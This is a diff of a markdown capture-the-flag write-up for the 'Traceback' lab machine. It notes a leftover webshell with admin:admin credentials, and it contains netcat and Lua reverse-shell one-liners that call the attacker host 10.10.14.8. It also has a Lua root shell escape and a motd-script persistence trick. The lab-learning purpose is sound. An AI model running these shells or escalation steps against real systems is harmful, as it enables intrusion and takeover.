@@ -1,7 +1,7 @@
-# <span style="color:[COLOR]">Machine #17 Traceback</span>  
+# <span style="color:#FFFF66">Machine #17 Traceback</span>  
 
 
-## <span style="color:[COLOR]">Notes During Working on the Machine 🧐🤓   
+## <span style="color: #FFFF66">Notes During Working on the Machine 🧐🤓   
 
 * Wappalyzer is giving way off results  
 <img src="wappalyzer.png"> 
@@ -41,53 +41,52 @@
 * I found something `/smevk.php`. Instead of bruteforcing with `gobuster1 using the usual wordlists I used a list called "backdoor_list.txt" which is specifically to search for backdoors in web apps and I found one DAMN RIGHT!
 * The password is freaking admin:admin :o
 
-```cmd
-rm /tmp/a;mkfifo /tmp/a;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 4444 >/tmp/a
-```
+  ```cmd
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f
+  ```  
 
-```lua
-lua5.1 -e 'local host, port = "10.10.14.8", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
-```
-
-```lua
-require('socket');require('os');t=socket.tcp();t:connect('10.10.14.8','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');
-```
 * I got webadmin through the other hacker's webshell and then I got sysadmin through a bind shell using the sudo lua code I used the following code  
 
 * I just have getting the root left.
-```lua
-#\!/usr/local/bin/lua
-os.execute("/bin/bash");
-```
+  ```lua
+  #\!/usr/local/bin/lua
+  os.execute("/bin/bash");
+  ```
 
-```
-/etc/update-motd.d/50-motd-news
-/etc/update-motd.d/10-help-text
-/etc/update-motd.d/91-release-upgrade
-/etc/update-motd.d/00-header
-/etc/update-motd.d/80-esm
-```
+  ```
+  /etc/update-motd.d/50-motd-news
+  /etc/update-motd.d/10-help-text
+  /etc/update-motd.d/91-release-upgrade
+  /etc/update-motd.d/00-header
+  /etc/update-motd.d/80-esm
+  ```  
+
+  ```cmd
+  ssh -i id_ed25519 sysadmin@10.10.14.8
+  ```
+
+* I finally copied a rev shell into the "header" file because it was the only file that had proof that it's code is being executed.
+<br/><br/>
+
+
+
+## <span style="color: #FFFF66">How Did I Solve the Machine 😎🥳 
 
 
 <br/><br/>
 
 
 
-## <span style="color:[COLOR]">How Did I Solve the Machine 😎🥳 
+## <span style="color: #FFFF66">Where I Got Stuck?😡😧  
 
-
-<br/><br/>
-
-
-
-## <span style="color:[COLOR]">Where I Got Stuck?😡😧  
-
+* I kept using the wrong wordlist to bruteforce the directories using `gobuster`.
+* Turns out there is a wordlist in SecLists exactly to look for web shells and I found some login page hidden by the hacker.
 
 <br/><br/>
 
 
 
-## <span style="color:[COLOR]">What Did I learn from this Machine?👀  
+## <span style="color: #FFFF66">What Did I learn from this Machine?👀  
 
 * General info on Webshells  
   <blockquote>
@@ -98,7 +97,7 @@ os.execute("/bin/bash");
 
 
 
-## <span style="color:[COLOR]">Writeups ✍🏽📓   
+## <span style="color: #FFFF66">Writeups ✍🏽📓   
 
 
 <br/><br/>
